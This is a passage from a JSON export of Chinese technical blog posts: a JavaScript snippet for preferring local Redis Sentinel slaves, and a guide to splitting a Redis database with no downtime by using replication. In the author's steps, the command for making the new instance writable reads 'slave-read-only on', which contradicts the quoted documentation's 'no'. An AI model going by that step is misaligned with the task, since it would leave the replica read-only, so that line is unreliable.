#2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   preferLocalSlave(client);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.connector.resolveMaster = resolveMasterPreferLocal;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.connector.resolve = resolvePreferLocal;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   client.connector.check = checkPreferLocal;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">true</span>;\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'redis client('</span> + JSON.stringify({name: client.options.name<span style=\"text-decoration: underline;\">, db: client.options.db, sentinels: client.options.sentinels}) + </span><span style=\"color: #66cccc; text-decoration: underline;\">') status unexpected'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> <span style=\"color: #6699cc;\">false</span>;\n}\n</pre>\n</div>\n\n<p>\n用法如下\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">options</span> = {name: <span style=\"color: #66cccc;\">\"data\"</span>, sentinels: sentinels, db: 0, role: <span style=\"color: #66cccc;\">\"slave\"</span>, lazyCon<span style=\"text-decoration: underline;\">nect: </span><span style=\"color: #6699cc; text-decoration: underline;\">true</span><span style=\"text-decoration: underline;\">}</span>\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">client</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>(options);\n<span style=\"color: #99cc99;\">if</span> (preferLocal(client)) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">\"prefer local on redis sentinel(\"</span> + JSON.stringify(options) + <span style=\"color: #66cccc;\">\"</span><span style=\"color: #66cccc; text-decoration: underline;\">)\"</span><span style=\"text-decoration: underline;\">);</span>\n}\n</pre>\n</div>\n</div>\n</div>\n"
},
{
  "title": "redis 数据库不停机拆分扩容",
  "timestamp": "2016-09-22 11:02:00",
  "tags": [
    "redis"
  ],
  "body": "<p>\n服务开发之始，难以估算最终的数据规模，如按最大容量规划，则会增加项目起步时的复杂性，还有就是资源浪费。\n</p>\n\n<p>\n所以很多时候，数据都是塞在一个 redis 实例中，当服务规模扩大，单个 redis 实例不足以支撑未来的访问量时，再拆分数据（Partitioning）。\n</p>\n\n<p>\nRedis 有很多数据迁移工具，如：<a href=\"https://github.com/yaauie/redis-copy\">redis-copy</a> 、<a href=\"https://github.com/salimane/redis-tools\">redis-copy.py</a> 、<a href=\"http://redis.io/commands/migrate\">migrate</a> 等，但是迁移的数据量大时需要不短的时间，会对业务稳定性造成影响。\n</p>\n\n<p>\n真正可靠的迁移手段估计只有 Redis replication 方式。\n</p>\n\n<p>\n引用自 <a href=\"http://redis.io/topics/partitioning#presharding\">Partitioning: how to split data among multiple Redis instances. – Redis</a>\n</p>\n<blockquote>\n<p>\nUsing Redis replication you will likely be able to do the move with minimal or no\ndowntime for your users:\n</p>\n\n<ul class=\"org-ul\">\n<li>Start empty instances in your new server.\n</li>\n<li>Move data configuring these new instances as slaves for your source instances.\n</li>\n<li>Stop your clients.\n</li>\n<li>Update the configuration of the moved instances with the new server IP address.\n</li>\n<li>Send the SLAVEOF NO ONE command to the slaves in the new server.\n</li>\n<li>Restart your clients with the new updated configuration.\n</li>\n<li>Finally shut down the no longer used instances in the old server.\n</li>\n</ul>\n</blockquote>\n\n<p>\n引用自 <a href=\"http://redis.io/topics/admin\">Redis Administration – Redis</a>\n</p>\n<blockquote>\n<p>\nUpgrading or restarting a Redis instance without downtime\n</p>\n\n<p>\nRedis is designed to be a very long running process in your server. For instance many\nconfiguration options can be modified without any kind of restart using the CONFIG SET\ncommand.\n</p>\n\n<p>\nStarting from Redis 2.2 it is even possible to switch from AOF to RDB snapshots\npersistence or the other way around without restarting Redis. Check the output of the\nCONFIG GET * command for more information.\n</p>\n\n<p>\nHowever from time to time a restart is mandatory, for instance in order to upgrade the\nRedis process to a newer version, or when you need to modify some configuration parameter\nthat is currently not supported by the CONFIG command.\n</p>\n\n<p>\nThe following steps provide a very commonly used way in order to avoid any downtime.\n</p>\n\n<ul class=\"org-ul\">\n<li>Setup your new Redis instance as a slave for your current Redis instance. In order to\ndo so you need a different server, or a server that has enough RAM to keep two\ninstances of Redis running at the same time.\n</li>\n<li>If you use a single server, make sure that the slave is started in a different port\nthan the master instance, otherwise the slave will not be able to start at all.\n</li>\n<li>Wait for the replication initial synchronization to complete (check the slave log\nfile).\n</li>\n<li>Make sure using INFO that there are the same number of keys in the master and in the\nslave. Check with redis-cli that the slave is working as you wish and is replying to\nyour commands.\n</li>\n<li>Allow writes to the slave using CONFIG SET slave-read-only no\n</li>\n<li>Configure all your clients in order to use the new instance (that is, the slave).\n</li>\n<li>Once you are sure that the master is no longer receiving any query (you can check\nthis with the MONITOR command), elect the slave to master using the SLAVEOF NO ONE\ncommand, and shut down your master.\n</li>\n</ul>\n</blockquote>\n\n<p>\n以下步骤可以不断进行，直到将数据拆到很细的粒度，值得注意的是这种拆分方法只支持将一部分数据拆分到全新的 Redis 实例。\n</p>\n\n<ul class=\"org-ul\">\n<li>创建新 Redis 实例为旧 Redis 实例的 Slave\n</li>\n\n<li>服务同时连接新旧 Redis 实例\n\n<p>\n迁移时代码需要更新并重启服务，服务需支持优雅重启：服务进程依次重启使得客户感觉不到服务被中断。\n</p>\n\n<p>\n通过预先连接新旧 Redis 实例，使得接下来的迁移动作不需要重启服务，一键瞬间完成。\n</p>\n\n<p>\n迁移后，清除新旧 Redis 实例中的删除脏数据可能耗时较长，对于通过 scan 扫描数据的业务逻辑部分，需容忍脏数据：根据 hash 规则，扫描到数据不属于当前 Redis 实例时忽略掉，避免使用脏数据。\n</p>\n</li>\n\n<li>让新 Redis 实例可写\n\n<pre class=\"example\">\nconfig set slave-read-only on\n</pre>\n\n<p>\n旧 Redis 的写请求还会同步到新的 Redis 实例。\n</p>\n\n<p>\n要求新旧 Redis 实例比较稳定，发生全量同步会导致数据丢失。\n</p>\n</li>\n\n<li>服务从新 Redis 实例访问迁移走的数据\n\n<p>\n可以通过给所有服务结点广播消息方式实现，将服务的 Redis 访问快速切到新 Redis 实例上。\n</p>\n\n<p>\n正常情况下，旧 Redis 中已迁移的数据应该不会再有读写，如果有的话可能是还没有迁移干净，应该立即找到访问源，进行中断或迁移。\n</p>\n</li>\n\n<li>新 Redis 实例断开与旧实例的 Master-Slave 关系\n</li>\n\n<li>删除旧 Redis 实例中已迁走的数据\n</li>\n\n<li>删除新 Redis 实例中多迁来的数据\n</li>\n</ul>\n"
}]